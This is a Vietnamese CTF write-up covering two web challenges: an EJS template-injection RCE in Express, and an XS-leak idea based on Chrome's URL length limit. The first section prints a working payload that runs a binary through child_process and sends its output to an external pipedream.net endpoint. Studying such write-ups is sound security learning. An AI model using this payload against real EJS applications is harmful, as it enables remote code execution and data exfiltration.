## Express JavaScript Security

<img width="806" alt="Untitled" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/2e1e56bb-c804-409e-a6a4-aacd3f5b07b1">

Đầu tiên, ta cùng nhìn sơ qua challenge:
- Để đọc flag ta cần RCE được web để chạy file `/readflag` lấy flag.
```Dockerfile
FROM node:18-bullseye-slim

RUN apt-get update && \
apt-get install -y dumb-init gcc && \
rm -rf /var/lib/apt/lists/*

RUN addgroup ejs && \
adduser --disabled-password --gecos "" --ingroup ejs ejs

WORKDIR /home/ejs/app
RUN chown -R ejs:ejs .

COPY views ./views
COPY main.js package.json ./

RUN npm install

COPY flag.txt /root/flag.txt

COPY readflag.c /readflag.c
RUN gcc -o /readflag /readflag.c && rm /readflag.c
RUN chmod +rxs /readflag

USER ejs

ENTRYPOINT ["/usr/bin/dumb-init", "--"]
CMD ["node", "./main.js"]
```

Bài này nhắm đến việc lợi dụng lỗ hổng Server side template injection trong `settings[view options]` của `ejs`.

```js
const express = require('express');
const ejs = require('ejs');

const app = express();

app.set('view engine', 'ejs');

const BLACKLIST = [
    "outputFunctionName",
    "escapeFunction",
    "localsName",
    "destructuredLocals"
]

app.get('/', (req, res) => {
    return res.render('index');
});

app.get('/greet', (req, res) => {
    
    const data = JSON.stringify(req.query);

    if (BLACKLIST.find((item) => data.includes(item))) {
        return res.status(400).send('Can you not?');
    }

    return res.render('greet', {
        ...JSON.parse(data),
        cache: false
    });
});

app.listen(3000, () => {
    console.log('Server listening on port 3000')
})
```
Có 5 options có thể gây ra RCE bao gồm: `outputFunctionName`, `escapeFunction`, `escape`, `localsName`, `destructuredLocals`. Bài đã filter 4 cái còn lại mỗi `escape`, để có thể trigger được escape, ta cần điều kiện là option client không null (Đọc code để biết thêm, mình lười lục lại wa).

Payload:
```
/greet?name=ehehhee&font=Arial&fontSize=20&settings[view%20options][client]=notempty&settings[view%20options][escape]=JSON.stringify;console.log(global.process.mainModule.require('http').get('http://eov5gzrmq5p9826.m.pipedream.net',%20{headers:%20{'User-Agent':global.process.mainModule.require('child_process').execSync('/readflag').toString('base64')}}))&debug=true
```

Exploit:

<img width="805" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/a8c07e95-ccc8-48d1-a5fa-1bba04d50d54">

Flag:

<img width="535" alt="Screenshot 2023-08-25 170601" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/8b30ea74-49b6-41eb-ab60-fce85a4864f8">

Link research:
- https://kerupuksambel.medium.com/pwn2win-2021-ctf-writeup-illusion-88f6c7737de3
- https://kerupuksambel.medium.com/pwn2win-2021-ctf-writeup-illusion-88f6c7737de3
- https://jorgectf.github.io/blog/post/finding-prototype-pollution-gadgets-with-codeql/

Khi debug ở máy, nên bật debug=true để xem nội dung src được chèn.

## MANDATORY NOTES

Một bài xsleak ý tưởng từ max url length của chrome, khá là hay nên mình làm lại sau giải.

```js
const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const path = require('path');

const app = express();

app.use(express.static('static'))

app.use(session({
    secret: crypto.randomBytes(64).toString('hex'),
    resave: false,
    saveUninitialized: false,
    cookie: { sameSite: 'lax' }
}))

app.use(bodyParser.urlencoded({ extended: false }));

const initSession = (req, res, next) => {
    if (!req.session.notes) {
        req.session.notes = [];
    }
    next();
}

app.get('/', initSession, (req, res) => {
    const query = req.query.q;

    if (!query) {
        return res.sendFile(path.join(__dirname, 'index.html'));
    }

    const found = req.session.notes.filter(note => note.text.includes(query));

    if (!found.length) {
        return res.redirect('/?found=0');
    }
    return res.redirect(`/?found=1#${btoa(JSON.stringify(found.map(note => note.id)))}`);
})

app.post('/save', initSession, (req, res) => {
    req.session.notes.push({ id: req.session.notes.length, text: req.body.note });
    return res.redirect('/');
})

app.get('/notes', initSession, (req, res) => {
    return res.json(req.session.notes);
})

app.listen(80, () => console.log('Listening on port 80'));
```

Sơ qua về code phía server:
- Khi người dùng lưu note ở route `/save` thì note sẽ được lưu ở trong session.
- Query `/?q=xyz` sẽ tìm notes liên quan đến q, nếu tìm thấy thì sẽ thực hiện `res.redirect(`/?found=1#${btoa(JSON.stringify(found.map(note => note.id)))}`);`. Sau dấu `#` sẽ là based64 mảng chứa id các note được tìm thấy ví dụ `[0,3]`.
- Cookie được set là `samesite: lax`


Code phía client:
```js
const notesEl = document.getElementById('notes')

let isSearch = false
let searchResults = []

if (new URLSearchParams(location.search).get('found') === '1' && location.hash) {
    searchResults = JSON.parse(atob(location.hash.slice(1)))
    isSearch = true
}

const loadNotes = (notes) => {
    if (!notes.length) {
        const noteEl = document.createElement('p')
        noteEl.textContent = 'No notes found'
        notesEl.appendChild(noteEl)
        return
    }

    notes.forEach(note => {
        if (isSearch && !searchResults.includes(note.id)) return
        const noteEl = document.createElement('p')
        noteEl.textContent = note.text
        notesEl.appendChild(noteEl)
    })
}

fetch('/notes')
    .then(res => res.json())
    .then(notes => loadNotes(notes))
```

Hành động của admin bot:

```js
import puppeteer from 'puppeteer'
import express from 'express'
import rateLimit from 'express-rate-limit'

const app = express()
app.use(express.static('static'))
app.use(express.json())

const port = 80

async function visit(url) {

    const browser = await puppeteer.launch({
        dumpio: true,
        pipe: true,
        args: [
            '--js-flags=--jitless,--no-expose-wasm',
            '--disable-gpu',
            '--disable-dev-shm-usage'
        ]
    })

    const ctx = await browser.createIncognitoBrowserContext()
    const page = await ctx.newPage()

    try {
        await page.goto('http://192.168.83.130:8000', { timeout: 5000, waitUntil: 'networkidle2' })
        await page.type("#note", process.env.FLAG)
        await page.click("#submit")
        
        // Go to your URL
        await page.goto(url, { timeout: 10000, waitUntil: 'networkidle2' })
        await page.waitForTimeout(30000)
    } finally {
        await page.close()
        await ctx.close()
    }

    await browser.close()
}

app.use(
    '/visit',
    rateLimit({
        windowMs: 60 * 1000,
        max: 3, // 3 requests per minute
        message: { error: 'Too many requests, try again later' }
    })
)

app.post('/visit', async (req, res) => {
    const url = req.body.url
    if (
        url === undefined ||
        (!url.startsWith('http://') && !url.startsWith('https://'))
    ) {
        return res.status(400).send({ error: 'Invalid URL' })
    }

    try {
        console.log(`[*] Visiting ${url}`)
        await visit(url)
        console.log(`[*] Done visiting ${url}`)
        return res.sendStatus(200)
    } catch (e) {
        console.error(`[-] Error visiting ${url}: ${e.message}`)
        return res.status(400).send({ error: e.message })
    }
})

app.listen(port, async () => {
    console.log(`[*] Listening on port ${port}`)
})
```

Set flag vào note và visit đến site mà ta đưa vào.

Ý tưởng: Lợi dụng URL limit 2MB trong Chrome
- Làm cho độ dài khi query nhỏ hơn 2MB, do đó khi điều hướng đến ?found=0 với phần fragment sẽ vừa đủ 2MB và gây ra `about:blank#block`
- Nếu tìm kiếm có thì fragment mới sẽ thay phần `#AAA...AAA` nên sẽ không aborted.

